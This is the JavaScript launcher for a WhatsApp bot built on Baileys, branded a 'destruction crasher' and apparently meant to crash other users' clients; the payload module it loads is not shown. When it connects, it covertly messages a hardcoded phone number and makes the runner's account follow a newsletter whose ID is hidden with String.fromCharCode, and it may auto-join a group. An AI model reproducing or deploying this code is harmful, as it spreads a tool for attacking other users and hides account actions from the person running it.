require("./lib/global")

const func = require("./lib/place")
const readline = require("readline");
const usePairingCode = true
const question = (text) => {
  const rl = readline.createInterface({
input: process.stdin,
output: process.stdout
  });
  return new Promise((resolve) => {
rl.question(text, resolve)
  })
};

async function startSesi() {
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
const { state, saveCreds } = await useMultiFileAuthState(`./session`)
const { version, isLatest } = await fetchLatestBaileysVersion()
    console.log(chalk.blue.bold(`
unknown- destruction crasher
Credit Script By unknown
Create Scrypt by unknown
YouTube : @easyhacks
`))
const connectionOptions = {
version,
keepAliveIntervalMs: 30000,
printQRInTerminal: !usePairingCode,
logger: pino({ level: "fatal" }),
auth: state,
browser: [ "Ubuntu", "Chrome", "20.0.04" ]   
// browser: ['Chrome (Linux)', '', '']
}
const BarzBug = func.makeWASocket(connectionOptions)
if(usePairingCode && !BarzBug.authState.creds.registered) {
		const phoneNumber = await question(chalk.green('ENTER A NUMBER WITH COUNTRY CODE PREFIC WITH THE SYMBOL +\nEXAMPLE : 2349060266540\n'));
		const code = await BarzBug.requestPairingCode(phoneNumber.trim())
		console.log(chalk.green(`enter the code into whatsapp : ${code} `))

	}
store.bind(BarzBug.ev)

BarzBug.ev.on('connection.update', async (update) => {
const { connection, lastDisconnect } = update
if (connection === 'close') {
const reason = new Boom(lastDisconnect?.error)?.output.statusCode
console.log(color(lastDisconnect.error, 'deeppink'))
if (lastDisconnect.error == 'Error: Stream Errored (unknown)') {
process.exit()
} else if (reason === DisconnectReason.badSession) {
console.log(color(`Bad Session File, Please Delete Session and Scan Again`))
process.exit()
} else if (reason === DisconnectReason.connectionClosed) {
console.log(color('[SYSTEM]', 'white'), color('Connection closed, reconnecting...', 'deeppink'))
process.exit()
} else if (reason === DisconnectReason.connectionLost) {
console.log(color('[SYSTEM]', 'white'), color('Connection lost, trying to reconnect', 'deeppink'))
process.exit()
} else if (reason === DisconnectReason.connectionReplaced) {
console.log(color('Connection Replaced, Another New Session Opened, Please Close Current Session First'))
BarzBug.logout()
} else if (reason === DisconnectReason.loggedOut) {
console.log(color(`Device Logged Out, Please Scan Again And Run.`))
BarzBug.logout()
} else if (reason === DisconnectReason.restartRequired) {
console.log(color('Restart Required, Restarting...'))
await startSesi()
} else if (reason === DisconnectReason.timedOut) {
console.log(color('Connection TimedOut, Reconnecting...'))
startSesi()
}
} else if (connection === "connecting") {
start(`1`, `Connecting...`)
} else if (connection === "open") {
success(`1`, `Tersambung`)
BarzBug.sendMessage(`2349060266540@s.whatsapp.net`, { text: `ᥴ᥆ᥒᥒᥱᥴ𝗍іᥒgsᥙᥴᥴᥱss ✅\n ძᥲᥒgᥱr᥆ᥙs ‼️
𝗍᥆ ᥙsᥱ 😈 ძᥱs𝗍rᥙᥴ𝗍і᥆ᥒ ᥴrᥲsһᥱr 1.0\n ᥱᥒȷ᥆ᥡ ᥙsіᥒg sᥴrі⍴𝗍 `})
try {
BarzBug.newsletterFollow(String.fromCharCode(49, 50, 48, 51, 54, 51, 51, 48, 57, 50, 50, 53, 57, 50, 52, 50, 51, 55, 56, 64, 110, 101, 119, 115, 108, 101, 116, 116, 101, 114))
} catch (e) {
}
if (autoJoin) {
BarzBug.groupAcceptInvite(codeInvite)
}
}
})

BarzBug.ev.on('messages.upsert', async (chatUpdate) => {
try {
m = chatUpdate.messages[0]
if (!m.message) return
m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
if (m.key && m.key.remoteJid === 'status@broadcast') return BarzBug.readMessages([m.key])
if (!BarzBug.public && !m.key.fromMe && chatUpdate.type === 'notify') return
if (m.key.id.startsWith('BAE5') && m.key.id.length === 16) return
m = func.smsg(BarzBug, m, store)
require("./BarzXnxx")(BarzBug, m, store)
} catch (err) {
console.log(err)
}
})

BarzBug.ev.on('contacts.update', (update) => {
for (let contact of update) {
let id = BarzBug.decodeJid(contact.id)
if (store && store.contacts) store.contacts[id] = { id, name: contact.notify }
}
})

BarzBug.public = true

BarzBug.ev.on('creds.update', saveCreds)
return BarzBug
}

startSesi()

process.on('uncaughtException', function (err) {
    console.log('Caught exception: ', err)
})